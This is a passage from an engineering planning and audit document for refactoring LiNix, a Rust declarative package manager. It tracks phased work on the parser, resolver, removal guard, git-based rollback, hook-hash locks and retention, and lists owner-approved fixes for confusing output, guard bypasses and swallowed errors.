| **Stage 2** — `Migrator::discover()`, one crawl shared by migrate and audit, `manual_source()`, atomic manifest write | `9847544` | **Keep.** Becomes `adopt` (II.9). **Except** its protected-skip — see II.9, E7. |
| **Stage 3** — harness config isolation, the `okf` coverage ratchet, the JSON-check fix | `d1b1edc` | **Mostly superseded.** The harness is rebuilt in Phase 5. Keep the isolation and the ratchet idea. |
| **Stage 4** — the `-g` overlay model, `wish_dirs()`, `config_root()`, `is_reserved_manifest` | `fb9f08c` | **Thrown away.** Phase 0 deletes `-g` entirely. This is real work that this design discards, knowingly (V.1). |

**Stage 4 is a deliberate write-off.** It correctly fixed `-g` by making it additive; the
new model deletes the flag instead. Do not try to preserve it.

## Phase 0 — Delete

> **⚠ Marked ✅ elsewhere in this document. It is not done** (audited 2026-07-17, twice;
> Part VII). The `-g` *flag* is gone. **`keep.txt` and `_active_profiles.txt` are now genuinely
> dead** (Phase 2e/2f); `groups_dir` (≈51 refs, was 84), `prune` and `migrate` (606 lines) are
> still live, and **`local.txt` still has readers** — `insight.rs:418` `line_declares`, which
> Part VII wrongly recorded as deleted.
> **The reason it matters is in this section's own first line:** *do this first so nothing is
> carefully ported that was about to be deleted.* That is now happening.

**Pure subtraction. Nothing new can break. Tests stay green except those testing deleted
features.** Do this first so nothing is carefully ported that was about to be deleted.

Delete everything in II.17. Delete the ~884 marketing comments. Delete every legacy branch
(`generation.rs` bare-filename keys, the `<name>/`-directory profile form).

**Exit:** `cargo test` green. Codebase measurably smaller. Report the line count removed.

## Phase 1 — One parser and the grammar

> **⚠ Marked ✅ elsewhere in this document. Half done** (audited 2026-07-17, Part VII).
> **The grammar is built and it is good. The unification never happened:** `grammar/statement.rs`
> was added *alongside* the other parsers rather than substituted for them. The bullet directly
> below is the unmet one — it is a *replacement*, not an addition, and the ✅ was awarded for the
> addition. **Re-audited 2026-07-17: it is now three skippers, not six** (`insight.rs:428`,
> `manifest.rs:90`, `main.rs:1378`) — **and the bullet's own citation has rotted: `resolver.rs:212`
> no longer parses anything**, because Phase 2d rewired it onto `model::Resolver`. The count in
> that bullet is wrong in the direction this document never errs in — **the tree got better and
> the doc did not notice.** Do not read this as licence to trust it; read it as the tripwire
> working.

**C13 and the grammar are one job, not two.** The grammar *is* the parser; unifying five
parsers against the old grammar just to rewrite them is work done twice.

- One `backend:name` parser. **(re-measured 2026-07-16: EIGHT exist, SIX skip backend
  validation)** — including `resolver.rs:212`, the one that builds every `PackageSpec`.
  Only `split_removal_target` and one inline site at `main.rs:647` consult the registry.
  Every new prefix (`absent:`, `repo:`, `shim:`, `schedule:`, `re:`) is a thing a
  non-validating parser reads as a backend name. *(The first draft said five and three.)*
- Reserve `re` against the onboarder's custom backends.
- `{ }` blocks. Header decides body kind (keyword → lines, declaration → options).
- Comments: whole-line, trailing on statements, **never inside block values**.
- Options: short form (no commas), block form (verbatim to EOL), repeated key = list.
- `@2.0` → error. `@requires=bar` (bare) → error.
- **Unknown line → error**, naming file, line, and what was expected.

**Exit:** unit tests for every grammar rule above, including every error case.

> **Three II.2 rules had no implementation (audited 2026-07-17). ALL THREE now closed (Phase
> 2q) — the audit was right, and each is now enforced with a test.**
>
> - **~~`@until` "on `absent:` only" is not enforced~~ — FIXED (Phase 2q).** `validate_options`
>   now takes an `absent: bool` (threaded from the `absent:` branch of `parse`), and a present
>   line carrying `@until` is refused, naming the file and line, with a hint pointing at
>   `@expires`. Test: `until_on_a_present_line_is_refused`. `apt:jq@until=…` no longer parses
>   clean. *(The comment that "read exactly like a check" is now a check.)*
> - **~~II.2's option-key table is not a whitelist~~ — was already FIXED by S19 (Phase 2l).**
>   `validate_options` rejects any key not in `PACKAGE_OPTION_KEYS` (plus the `*_install`
>   suffix). `apt:jq@versionn=1.6` errors, listing the real keys. Test:
>   `an_unknown_key_lists_the_real_ones`. This audit bullet was stale by the time it was written.
> - **~~`link:` cannot take a Windows path~~ — FIXED (Phase 2q).** The expression check now runs
>   only when the line does *not* open with a typed-statement prefix (`starts_with_statement_prefix`
>   guards `absent:`/`repo:`/`shim:`/`schedule:`/`service:`/`link:`). `link:C:\Users\me\.vimrc`
>   parses as `Statement::Link` again; a bare `editors | fonts` is still an `Expr`. **II.4's set
>   math no longer eats II.2's statements.** Test: `a_link_with_a_windows_path_is_a_link_not_an_expression`.
>
> Also, two smaller findings, both now resolved/tracked:
> - **~~`statement.rs:66` calls the enum "II.2's full list" but it includes II.4's set ops~~ —
>   FIXED (Phase 2x):** the doc comment now says it is the union of II.2's statements and
>   II.4's set-math, not "II.2's full list".
> - **`schedule:NAME` "(only in `schedules`)" has no file-context check — it parses in a
>   module.** Still true, and it is **part of wiring `schedule:` at all**, which is unbuilt:
>   the layout has `schedules_file()` but the resolver never reads it, so `schedule:` only ever
>   lands in `extras` and `sync` warns it is unapplied (S12). The check ("`schedule:` belongs
>   in the `schedules` file, and a `schedule:` line anywhere else is an error") lands **with the
>   scheduler wiring — tracked as S21 → Phase 5**, because there is nowhere for a correctly-placed
>   `schedule:` line to go until then.

## Phase 2 — The model (the cliff)

**Cannot be split.** Everything above the seam breaks at once. Do not run two models behind
a flag — that is the "two ways to do one thing" disease, done to ourselves.

- The layout (II.1). `modules/`, `profiles/`, `active`, `priority`, `schedules`, `locks/`,
  `preferences.toml`.
- The resolver (II.7): profiles choose, lazy parsing, conflicts are errors, the layering
  rule, dated lines.
- Profile set algebra, resolved at read time. **No `_active_profiles.txt`, no
  materialization.**
- `PackageSpec` gains **present/absent**. That is the only new thing the desired-state map
  can't already carry.
- Ordering phases in the planner: repos → index refresh → packages → dependents.
- The command surface (II.8).

**The seam:** everything upstream produces `HashMap<backend, Vec<PackageSpec>>`; everything
downstream consumes it. `src/backends/` (11,193 lines), `src/core/` (4,499), and
`src/parsers/` (2,275) — **~45% of the codebase — never notice this happened.**

**Exit:** the harness green on one distro.

> **Exit-condition ordering, resolved (2026-07-17).** This exit collides with Phase 5, which
> *rebuilds* the harness for the new model — you cannot run "the harness" green on the new model
> before Phase 5 makes one that understands it, and the old harness asserts the old
> (pre-seam) surface. So the exit splits in two, honestly:
> - **The model-side of Phase 2 is complete** — every checklist box is `[x]`, 521 unit/integration
>   tests pass, clippy is silent, and the command surface, resolver, ordering phases and
>   deletions are all verified against the binary. That is everything Phase 2 *builds*.
> - **The green-harness-on-one-distro gate is carried to Phase 5/6**, which own the harness
>   rebuild (Phase 5, first bullet) and the five containers (Phase 6). It is not skipped — it is
>   filed where the harness it names actually exists. The two functional follow-ups found here
>   (**S20** extras-drift → Phase 4, **S21** `schedule:` wiring → Phase 5) are tracked in VI.2, so
>   nothing about "the model" is left implicit in this decision.

## Phase 3 — The guard

- 16 → 9 (II.10). One decision function. *(The first draft said five, then six. The owner
  chose to keep all three orphaned `policy.toml` rules rather than delete them — V.43.)*
  **Audited 2026-07-17 — the starting point is not what II.10 implies.** Four of the nine are in
  `guard.rs` (`protected_packages`, `unprotected_packages`, OS-essential, `max_removals`); four
  are in a **separate `Policy` struct** (`app/policy.rs`) loaded from `groups_dir/policy.toml` —
  **a file II.17 deletes** — with `require_snapshot`/`deny_vulnerable` enforced ad-hoc in
  `main.rs:3176`/`:3181` rather than in any guard; and ~~**`max_installs` does not exist anywhere
  in `src/`**~~ — **DONE (install ceiling): `Config::max_installs` (default 0 = unset) +
  `guard::enforce_installs` + `Objection::TooManyInstalls`, enforced at the one sync choke point
  (`SyncEngine::sync`), with `--allow-mass-install` (CLI-only, mirrors `allow_mass_removal`). Five
  tests.** ~~`policy.rs:25` also has a **tenth rule the spec never mentions**
  (`allow_backends`).~~ **DONE — `allow_backends` deleted, not migrated: the `priority` file is
  what "only these backends" means now (V.15).** **"One decision function" is the work, not the
  summary:** ~~today there are three (`guard::protection_of`, `guard::inspect`,
  `Policy::check_specs`)~~ — **DONE (consolidation): `policy.rs` is deleted and its four rules now
  populate `GuardSettings` (the `[guard]` table, their II.17 home). The guard owns the spec-level
  checks — `guard::inspect_desired` → `Objection::Denied`/`Unpinned`, rendered by
  `describe_objection`; `require_snapshot`/`deny_vulnerable` stay in `enforce_policy` (they need
  the snapshot provider + audit report) but read `config.guard` and share the violation list.
  `enforce_policy` and `handle_policy` read `[guard]`, not `policy.toml`.** `Objection`
  (`guard.rs`) ~~has **two variants**~~ **now has five (`Protected`, `TooMany`, `TooManyInstalls`,
  `Denied`, `Unpinned`).** ~~`--allow-mass-install` (II.10:578) does not exist either.~~ **DONE.**
  ~~**Remaining mechanical step:** the four removal-count rules (`protected_packages`,
  `unprotected_packages`, `max_removals`, `max_installs`) still sit as top-level `Config` fields;
  renaming them under `[guard]` alongside the other four is all that is left of "one home".~~
  **DONE — all nine now live in the `[guard]` table.** The four moved into `GuardSettings` with a
  manual `Default` so the removal-safety defaults survive (an empty protected list or a zero
  ceiling there would silently disarm the guard); `is_empty()` stays scoped to the install/change
  rules only; the config template, `examples/config.toml`, `linix protected`, and the refusal
  messages all read/emit `[guard]`. **"Nine refusals, one home" is now literally true.**
- **Every removal path calls it.** ~~Today's misses: `uninstall` (C1), leases and `absent:`
  (C3), ghost-shell exit (C8), `clean`.~~ **Mostly DONE by architecture, verified 2026-07-17:
  plain `uninstall` undeclares then calls `handle_sync` → guarded (`GuardScope::Sync`); `absent:`
  becomes drift removed by sync → guarded; ghost-shell `suspend_for_session` calls
  `guard::enforce` explicitly (`main.rs:1222`); leases were deleted in Phase 2, so C3's lease
  half no longer exists. THE ONE REAL MISS IS `clean`** — it calls `clean_orphans` directly, and
  routing it through the guard needs a backend `list_orphans` capability (list intended orphans,
  check against protection, refuse if any is protected) that does not exist yet — a ~20-backend
  trait addition, its own chunk.
- ~~One lease-expiry implementation (C9 — two exist today with different semantics).~~ **Moot —
  leases were removed entirely in Phase 2 (the `lease` command, `LeaseArgs`, and both expiry
  paths are gone; timed absence is now the dated-line machinery, `@expires`/`@until`).**
- ~~The ratio check and `purge-unmanaged` (II.11).~~ **DONE — `handle_purge_unmanaged` prints the
  whole list, applies the ratio check (`PURGE_RATIO = 0.1`) with II.11's exact message before
  anything else, uses `enforce_deliberate` (protection + OS-essential apply, `max_removals` does
  not), takes a snapshot first or prints "THERE IS NO UNDO FOR THIS", and requires a typed
  count. Tests in `main.rs::purge_tests` (3/576 and 1/14 refused, 103/476 and adopted-Alpine
  allowed).**
- ~~`unprotected_packages` must beat OS-essential (B3 — the code clears the config rule, then
  falls through to the OS check, which fires anyway).~~ **DONE — `guard::protection_of` checks
  `unprotect_rule` first and returns `None`, before the OS-essential check runs; proven by the
  `unprotect_wins_over_the_os_essential_flag` test.**

**Exit:** a test per removal path proving the guard fires.

## Phase 4 — Locks and git

- `locks/` (II.6): version, resolved backend, frozen regex expansions, hook hashes.
  - **hook hashes — DONE (II.12 "the lock is the approval"), 2026-07-17.** New pure module
    `core/hook_lock.rs`: `HookLedger` (→ `locks/hooks.toml`, a `BTreeMap<hook_id, sha256>` that
    diffs cleanly), `hash_script`, `hook_id`, the `Verdict` enum (`Approved`/`New`/`Changed`),
    and the II.12 refusal message. `LuaHooks` gained `verify_all_approved()` — the supply-chain
    gate — called with `?` at the **top of `SyncEngine::sync`**, before any hook runs and before
    anything is touched, so a new or changed hook **stops the sync**; `-y` cannot skip it (the
    old `run_before_sync` swallowed its own errors, which is why the authoritative stop had to
    move here). `linix lock` now also approves hooks (`approve_all_hooks`) — the only writer of
    an approval, so approval stays deliberate. **What I checked:** `cargo build --all-targets` is
    clean; **11 unit tests written but NOT executed this session** (no-run constraint) — they
    cover hash stability/sensitivity, the New/Approved/Changed verdicts, identity isolation,
    re-approval, TOML round-trip, missing-file load, and both refusal messages. **Honest gaps:**
    (1) it currently hashes the **inline `config.hooks`** scripts (source tag `"config"`) — the
    whole-sync `before_sync`/`after_sync` kind. Per owner ruling 2026-07-17 that source **stays**
    (II.12's two kinds; `[hooks]` is off the delete list), so this is done and correct, not a
    to-be-migrated surface. **Still owed:** the *per-package* hooks (`before_install`/`after_install`,
    including module-attached ones from `github:x/y`) are not yet run through the ledger — the
    mechanism is identical and reusable, but that wiring is the remaining half. (2) `plan` does not yet show the trust
    block (II.12's "adds repository / runs script [approved|CHANGED]"). (3) **Behaviour change:**
    a user with existing `config.hooks` must now run `linix lock` once before the next sync — the
    intended II.12 behaviour, but a change. (4) ~~The version-pin `locks.json` still sits beside
    `locks/` — its migration under `locks/` (below) is unchanged.~~ **DONE, 2026-07-17 — moved to
    `locks/versions.json`, joining the hook and extras ledgers; `locks/` is now the one home for
    all lock state (II.6). All read/write/doctor/help sites updated.**
- Commit on successful sync only. snapshot → apply → commit. Tag the snapshot.
- ~~`git checkout` + `sync` = rollback. Delete the generation format.~~ **DONE, 2026-07-17
  (owner-approved migration, steps A–C).** (A) `linix rollback <ref>` checks out the manifests at
  a git commit then syncs — the one rollback; the per-package/`--with-config` flags are gone
  (git checkout is whole-config). (B) The `cockpit` TUI was rebuilt on git history (timeline =
  commit log; each row shows the manifest lines that commit changed, via
  `GitManager::commit_manifest_changes`; rollback checks out + syncs). (C) `src/app/generation.rs`
  (745 lines) and the whole subsystem deleted — `record_generation`, `rollback_to`,
  `generation_store`, `handle_generation`, the `generation` CLI command + args,
  `RetentionConfig.generations`, and `undo`'s `restore_matching_generation` (a whole-`/` snapshot
  already reverts manifests + registry). **Checked:** `cargo check --lib`/`--bin`/`--tests` all
  clean, no warnings; unit tests written (cockpit render + `parse_manifest_changes`), not run.
- ~~`linix diff COMMIT COMMIT` in packages, not text.~~ **DONE, 2026-07-17.** `linix diff <from>
  [to]` prints the manifest lines added/removed between two commits (omit `to` → vs the working
  tree), plus an `N added, M removed` tally. Since manifests are package declarations, the diff of
  the config files IS the package-level story — new `GitManager::diff_manifest_changes` runs `git
  diff` limited to `modules/profiles/active/priority/schedules` and keeps the `+`/`-` lines (shared
  `parse_manifest_changes` with the cockpit). `cargo check --lib`/`--bin` clean; a git-repo unit
  test written (not run).
- ~~`bundle` = `git bundle` + artifacts + registry, **honest per-backend about what can't be
  bundled**.~~ **DONE, 2026-07-17.** It already copied the whole config root + `packages.json` +
  artifacts (with per-backend skip reporting); added the two missing halves: a `git bundle
  create --all` → `config.bundle` (full manifest history, so the air-gapped host can `rollback`
  to any commit — new `GitManager::bundle`, returns false + honestly reported when there's no
  repo/commits), and a copy of the ownership `registry.json` from the data root (II.1 — it lives
  beside the config, not in it). The bundle output now states each part's inclusion plainly
  (included / NOT included and why). `cargo check --lib`/`--bin` clean.
- ~~One retention engine.~~ **DONE, 2026-07-17.** There were two: generations and the `sync`-time
  snapshot prune both used `core::RetentionPolicy` (the correct engine, with the "always keep the
  newest" floor and the LiNix-ownership filter), but `App::prune_snapshots` (the `auto_prune`
  maintenance path) used a **separate** `SnapshotManager::prune_stale_snapshots` with different
  semantics — notably **no newest-floor**, so if every snapshot was older than `max_age_days` it
  deleted them all, leaving no rollback point. Deleted that duplicate; `prune_snapshots` now goes
  through `prune_with_policy` like `sync` does. Config was also doubled — **owner decision (NO
  LEGACY): the legacy `[snapshots]` `max_age_days`/`max_count` keys are DELETED.**
  `[retention.snapshots]` is the one surface; `Config::snapshot_retention()` reads it, and both
  call sites use it. To avoid a silent behaviour change (an empty policy keeps everything, so
  snapshots would accumulate), `RetentionConfig::default().snapshots` is now active — keep 10 /
  30 days, exactly what the deleted keys used to provide — while generations/manifests keep their
  keep-everything default. The `init -i` wizard writes `retention.snapshots.keep_last`. **Checked:**
  `cargo check --lib`/`--bin` clean, no warnings; **2 unit tests updated but NOT run** (default is
  10/30; explicit policy read straight through) + the wizard tests. The OS-level delete is
  untestable here; the policy resolution + selection is pure.

**Exit:** an air-gapped container restores from a bundle, or bundle says why it can't.

## Phase 5 — Harness and docs

- Rebuild the harness for the new model.
- ~~**G2:** 104 of 245 assertions are `soft` and cannot fail. Convert or register as debt.~~
  **MOOT, verified 2026-07-17.** The soft-assertion harness is gone — the v7 rewrite removed it;
  a grep for `soft`/`SoftAssert`/`assert_soft`/`non_fatal` across `src/` and `tests/` finds
  nothing. Every current test uses real `assert!`/`assert_eq!`. Nothing to convert.
- **G3 — mostly DONE, 2026-07-17.** `shim` (shim_manager tests, S1/S4), `adopt`/`migrate`
  (migrate.rs test module), `cockpit` (rebuilt on git with render tests), and `undo`
  (calculate_diff unit tests just added) are now covered. **`teleport` remains the thin
  gap** — but its core mechanism is the remove→install DAG executed by `Transaction`, which IS
  tested (`dag_test`); only teleport's own "already on target = no-op" / "not found = error"
  branches are unverified, and those need mock-query wiring. Low residual risk.
- ~~**H2:** two error-swallows on safety paths — `sync/mod.rs:463` (failed rollback-remove
  goes unreported), `shell/mod.rs:126` (dropped state write).~~ **DONE — the rollback swallow
  was actually in `core/transaction.rs::rollback` (the line number had drifted): every
  compensating action used `let _ =`, so a rollback that couldn't reinstall a just-removed
  package left it silently MISSING. It now reports each failure by name, returns Err, and all
  three auto-rollback call sites log it. GhostShell's dropped state write (`shell/mod.rs`) now
  warns with the true consequence.**
- **F4:** `--help` asks the registry for the backend count. The README line is generated.
- ~~**F1:** `network_timeout_secs` — **honour it** (today every consumer applies an
  undocumented `.max(10)` floor, so setting 5 silently gives you 10).~~ **DONE — both consumers
  (`insight.rs` audit client, `main.rs` module-fetch client) now use `.max(1)`, matching
  `node_registry`'s existing guard: honour any value ≥1, reject only a literal 0 (which reqwest
  reads as instant-fail, not "no timeout").**
- ~~**F1:** `max_parallel` — detect the core count.~~ **DONE. `default_max_parallel()` uses
  `std::thread::available_parallelism()` (respects container CPU limits), falls back to 4; the
  Default impl routes through it and the generated template comments the key out** (`config.rs:216`,
  `:304`; `main.rs:3117`). The 2026-07-17 audit flagged this DONE as contradicting II.17 (which
  listed `max_parallel` for deletion) and II.1 ("detected, never configured"). **Owner ruled
  2026-07-17: keep the manual override** — the core count is the default, but you may cap concurrency
  by hand. II.1, II.17, and V.41 were amended to match, so the contradiction is closed, not carried.
  The key is honoured for real: `sync/mod.rs:297` reads it (the old overwrite V.41 called "a lie" is
  gone). F1 is genuinely done.
- ~~**F1:** the generated `priority` file carries its reason in a comment (V.14).~~ **DONE —
  `model::priority::starter_file` (wired into `init` at `main.rs:4457`) already writes the
  "system managers first / pip last / when-block" rationale as the file header.**
- **F5:** fix the false doc comments.
- ~~**P6** goes in `CLAUDE.md`.~~ **DONE — repo-root `CLAUDE.md` carries P6 (comment states a
  constraint, nothing else) plus NO LEGACY, one `backend:name` parser, every-removal-path-guards,
  prefer-deleting, and the verify chain.**

### Rough edges — the 2026-07-17 review pass (owner-approved, one line each)

A read-through of the actual code for things that are silly, confusing, or unintuitive — silly
messages *and* silly features (a feature no user wants, two features that are really one, or a
feature with a better way to do it). Each line below is an owner-approved change, not a proposal.
**These are NO-LEGACY deletions: better code already exists (edit the file, sync). Do not
preserve the old thing or build a compatibility helper — remove it. The teardown shape is the
implementing agent's call; that it goes is not.**

- **R1 — Kill the theatrical house voice.** The tool narrates routine work like a spaceship:
  `LiNix Kernel: … kernel initialized successfully` on **every** command (`context.rs:116`),
  `Kernel: Commencing system-wide batch upgrade` (`context.rs:457`, `:446`, `:744`), `GhostShell:
  Dropping into hardened sandbox` / `Purging ephemeral state` (`shell/mod.rs:101`,`:114`,`:138`),
  `Cleaner: Initiating deep system cleanup` (`clean.rs:15`), `Teleporter: Executing atomic
  transition transaction` (`teleport.rs:124`). Logging defaults to `info` on stderr
  (`main.rs:43-46`), so all of it reaches ordinary users. Two fixes: (a) drop the
  `Component: TheatricalVerb…` style for plain, quiet language, and (b) demote pure-status lines
  like "kernel initialized" to `debug!` so they stop printing every run. The bar is `apt`/`dnf`:
  near-silent on a normal run.

- **R2 — Delete `teleport` outright.** A teleport is a prefix rewrite: `apt:nginx` → `snap:nginx`,
  then sync. The declarative model already does that — change the backend on the line and sync
  removes it from the old backend and installs it on the new. But `Teleporter` (`app/teleport.rs`)
  builds its **own** remove→install `StableDiGraph` and runs `Transaction::execute()` directly
  (`teleport.rs:107-133`), and `core/transaction.rs` has **no** guard call — so
  `teleport python3 snap` rips out `apt:python3` with no protected/essential/max-removal check.
  It is a second transaction engine *and* a guard bypass, for an operation that is one line-edit.
  Delete the command, `Teleporter`, `move_the_line`, and the CLI entry (`cli/args.rs:343-349`,
  handler `main.rs:3101`). A backend move is "rewrite the prefix, sync" — nothing more. If a
  convenience verb is ever wanted it must route through `handle_sync` (guard included), never its
  own transaction.

- **R3 — Delete the imperative `shim` command; shims are declarative only.** A shim is a small
  PATH stand-in that forwards to a managed tool. It is already produced declaratively: `@shim=true`
  on a package line, and `sync`'s `reconcile_all_shims` (`sync/mod.rs:148`,`:360`) creates it — and
  owns it (an imperatively-made shim is cleaned up on the next sync if the line lacks `@shim`). The
  `shim` command (`cli/args.rs:106-113`, handler `context.rs:828`) is a second, self-undoing path,
  and its **required** `--source` flag is discarded (`create_shim` binds it to `_source_spec` and
  never reads it) — a mandatory flag that does nothing. Owner ruling: go fully declarative. Delete
  the command and the dead flag; `@shim=true` + sync is the only way to make a shim.

- **R4 — Delete `generation rollback`; it is a subset of top-level `rollback`.** Both dispatch to
  the same `rollback_to()` (`main.rs:135` and `:1986`); `generation rollback` just hardcodes
  `with_config = false` (`:1986`). Top-level `rollback` takes `--package` and `--with-config`, so it
  does everything the generation form does and more. Owner ruling: delete `GenerationCommand::Rollback`,
  keep the top-level `rollback`.

- **R5 — Fix `unmanage`'s broken confirmation output (key mismatch).** The result JSON is built
  with key `"lines_removed"` (`main.rs:2950`) but the human printer reads `"manifest_lines_removed"`
  (`:2971`, `:2989`) — a key that never exists. So the count always prints 0 and the "removed
  declaration … from …" lines never show. The command does the work; only its output lies. Make the
  keys agree.

- **R6 — Plain notification emails; no emoji, no "Mission-Critical", no version.** The email
  subject bakes in emoji (`🚨 LiNix CRITICAL - …`, `notify.rs:151`), the body is titled "LiNix
  Mission-Critical Report" (`:153`), and the error level is "LiNix CRITICAL" (`:35`) — theatrical
  for a package-upgrade summary. The footer also hardcodes a stale version, "Automated Management
  via LiNix v5.0.0" (`:161`; tool is v6). Owner ruling: plain subject with no emoji, drop
  "Mission-Critical", and the footer reads exactly "Automated Management via LiNix" — no version
  string at all (nothing to go stale).

- **R7 — Strip all marketing language; "mission-critical" appears nowhere.** Replace the `--help`
  tagline and crate docs with a genuinely descriptive line (what it *does*: a declarative package
  manager — edit a file, sync the machine to match). This is a sweep, not one string. Kill every
  "mission-critical", "high-performance", "DAG-based orchestration", "enterprise/blazing/world-class"
  wherever it appears: `cli/args.rs:4-5`,`:12`,`:106`; `lib.rs:1`,`:3`; `notify.rs:153` (covered by
  R6); `context.rs:76`; `services.rs:98`; `core/state.rs:118`; `bin/shim.rs:4`; `main.rs:50` comment.
  Two of those log lines also carry stale hardcoded versions ("v3.6.0" at `services.rs:98`) — delete
  the version, don't update it. The test: help and output should describe the tool plainly, the way
  `apt`/`dnf` do, with zero adjectives selling it.

- **R8 — Rename `--i-really-mean-it` to `--allow-mass-purge`.** `purge-unmanaged` guards itself with
  the jokey `--i-really-mean-it` (`cli/args.rs:141`, used at `main.rs:2809`,`:2819`), while every
  sibling destructive gate is sober and consistent: `--allow-mass-removal`, `--allow-mass-install`
  (`args.rs:36`,`:43`). Rename it into that family — `--allow-mass-purge` — and update the flag, its
  handler param, and the hint text at `main.rs:2819`. One vocabulary for the guard, no jokes.

- **R9 — General rule: no emoji and no self-branding in user-facing output.** Output states the
  plain fact and the action to take; it does not decorate with emoji or narrate itself as "LiNix
  Insight" / "Semantic analysis". Concrete sites: the dependency hints at `diagnostics.rs:134`,`:235`
  (`💡 LiNix Insight: Semantic analysis identified a missing dependency` → `missing dependency: X —
  try: linix install X`), and the notification emoji at `notify.rs:23-26`,`:151` (covered by R6).
  A sweep confirmed those are the only two files with emoji, but this is a **standing rule** for all
  new output too: plain text, name the problem, name the fix.

- **R10 — Standardize the dry-run label to `[DRY-RUN]`.** It is uppercase almost everywhere, but two
  spots print lowercase `[dry-run]` — `bisect.rs:84` and `go.rs:159`. Same concept, one spelling: make
  both `[DRY-RUN]`.

- **R11 — Collapse `watch`'s duplicated sync pipeline into one shared reconcile.** `watch_reconcile`
  (`main.rs:515+`) hand-copies `handle_sync`'s body — resolve model, `enforce_policy`,
  `apply_repositories`, `ChangePlanner`, `print_flight_plan`, `sync_engine().sync()` — and its own
  comment admits "the same three ordering phases sync does." The `watch` feature is legitimate and it
  does go through the guard (`GuardScope::Watch`), so this is not a safety hole — it is a
  two-of-everything smell: change sync's ordering and `watch` silently drifts unless someone updates
  both. Not a deletion — a consolidation: extract one shared reconcile that both `handle_sync` and
  `watch_reconcile` call, with `watch` passing an unattended/no-confirm scope. Delete the copy.

- **R12 — Rename `cockpit` to a descriptive name.** The command (alias `tui`, `args.rs:360-363`)
  opens an interactive browser for generations, but is named "Time-travel cockpit" — nobody scanning
  `--help` guesses `cockpit` = "browse my generations." Rename to something plain like `browse` or
  `history`, keep `tui` as an alias, and drop the "time-travel" wording (also covered by R7). Exact
  name is the implementing agent's call.

- **R13 — Fix `uninstall`'s help wording.** Command help says "Imperatively uninstall one or more
  packages" and the arg help says "Names of packages to purge" (`args.rs:307-309`). "purge" collides
  with the separate `purge-unmanaged` command, and "Imperatively" is jargon that also contradicts the
  model — uninstall is undeclare + sync, i.e. declarative. Plain: "Uninstall one or more packages" /
  "Names of packages to uninstall."

- **R14 — Drop the "ghost shell" metaphor; don't clobber the user's prompt.** The `shell` command
  (ephemeral shell with packages loaded) brands itself "ghost shell" (`args.rs:353`), sets
  `LINIX_GHOST=true`, and forces `PROMPT_COMMAND` to prefix `(linix-ghost)` (`shell/mod.rs:175`,`:218`),
  which can stomp a user's own prompt setup. Rename to plain "ephemeral shell", and use a
  non-intrusive session marker (an env var the user can opt into displaying) instead of overwriting
  `PROMPT_COMMAND`.

- **R15 — "Flight plan" → plain "Planned changes".** The change preview header prints "Flight plan:"
  (`main.rs:3515`), and the aviation metaphor recurs in `--quiet` help and config comments
  (`args.rs:58`, `config.rs:208`, `main.rs:445`). Rename to something plain like "Planned changes:"
  everywhere the phrase appears.

- **R16 — Tone down the shouty `THERE IS NO UNDO FOR THIS.`** Printed in all-caps at `main.rs:2859`
  and `:2867` — the loudest string in the tool. The warning is justified for a destructive command,
  but sentence case carries it: "This cannot be undone." Fix both spots.

- **R17 — `export` must never silently overwrite; handle the conflict.** `export()` does
  `tokio::fs::write(path, text)` with no existence check, no backup, no `--force` (`export.rs:179`);
  the default out dir is `.` and with no `--format` it writes **every** format (`export.rs:158`). So
  `linix export` in a Node project overwrites the real `package.json` with a LiNix stub — and
  `handle_export` has no dry-run branch (`main.rs:3579`), so `--dry-run` clobbers it too. Meanwhile
  `module create` / `config init` / `init` all refuse to overwrite without `--force`. Fix:
  (a) honor `--dry-run` (write nothing, report what *would* be written); (b) **never silently clobber
  an existing file** — on a name collision, write to a non-colliding name (append a suffix, e.g.
  `package.linix.json`) or merge into the existing file where the format makes merge well-defined
  (e.g. appending `Brewfile` lines), never a blind replace; (c) `--force` for a deliberate plain
  overwrite. The default must be conflict-safe, not destructive.

- **R18 — `rollback` must refuse to apply unconfirmed in a non-interactive shell, like `sync` does.**
  In `rollback_to` (`main.rs:1897-1911`) the confirmation TUI runs only `if stdin().is_terminal()`, so
  a non-interactive shell (pipe/CI/cron) without `--yes` skips the check and falls through to apply.
  `handle_sync` in the same case hard-bails ("Refusing to apply changes without confirmation in a
  non-interactive shell", `main.rs:450-457`). So `echo | linix rollback <gen>` applies unprompted. It
  still routes through `GuardScope::Rollback` (protected packages safe), but the missing confirmation
  is a real sibling inconsistency. Fix: mirror `sync` — bail without `--yes` in a non-interactive shell.

- **R19 — `clean` must preview, respect the guard, and stop being blind.** Today `clean_orphans`
  (`context.rs:851-856`) loops **every** available backend and runs native orphan removal with
  auto-confirm baked in (`apt autoremove -y`, `pacman -Rs --noconfirm`, `dnf autoremove -y`, …) — no
  preview, and outside LiNix's `protected_packages`/`max_removals` guard (these are native-orphan
  removals the manager decides). Owner ruling:
  - **Orphan removal stays** (that is what it should do), but it must **show what it will remove and
    confirm** — the same flight-plan-then-confirm shape as `sync` — and **respect the protected list**,
    not run `-y`/`--noconfirm` blind.
  - The name "clean" reads as janitorial (caches). **Rename** it to say what it does (e.g.
    `remove-orphans`) if that is clearer.
  - **Cache-cleaning is a separate real need that must also exist** — either a second command
    (e.g. a cache cleaner) or one command with two modes. Both jobs (orphans, caches) must be doable.
    The exact command topology is the implementing agent's call; that both exist and that orphan
    removal previews + respects the guard is the ruling.

- **R20 — Auto-remediation swallows its state-save failure.** When failure diagnostics auto-installs
  a suggested package and persists the registry, `diagnostics.rs:206` writes
  `let _ = spawn_blocking(|| state_snapshot.save()).await.map_err(…)?` — the `?` catches only the task
  panic; the `let _ =` discards `save()`'s own `Result`. A disk-write failure (full/read-only/permission)
  is swallowed: the package is installed and in memory but never recorded, so the next `sync` treats it
  as unmanaged drift. The sibling save at `sync/mod.rs:136` propagates correctly with `??`. Fix: `?` → `??`.

- **R21 — File-backed backends report removal success when the file delete failed.** `github.rs:347-359`
  (and the same shape in `web.rs:260-268`, `appimage.rs:143`,`:176-177`): `remove()` drops the package
  from LiNix state, then best-effort deletes the binary and install dir with `let _ =`, logs "Purged",
  saves state, returns `Ok`. If the delete fails — locked binary (common on Windows), permission denied
  — the package vanishes from LiNix's view but the executable stays on disk and on PATH, and since
  queries read from LiNix state it becomes invisible drift no `sync` catches. Fix across all three
  backends: surface the delete failure — warn and do not record it as a clean removal; better, return
  the error so state is not updated as if the package is gone.

- **R22 — Prune counts IDs as deleted even when the delete failed.** `snapshot.rs:506-514` logs a
  failed `p.delete(id)` at `debug!` only and returns the full `doomed` list; `app/generation.rs:387`
  does `let _ = tokio::fs::remove_file(self.path_for(id)).await` and returns the full `doomed`. The
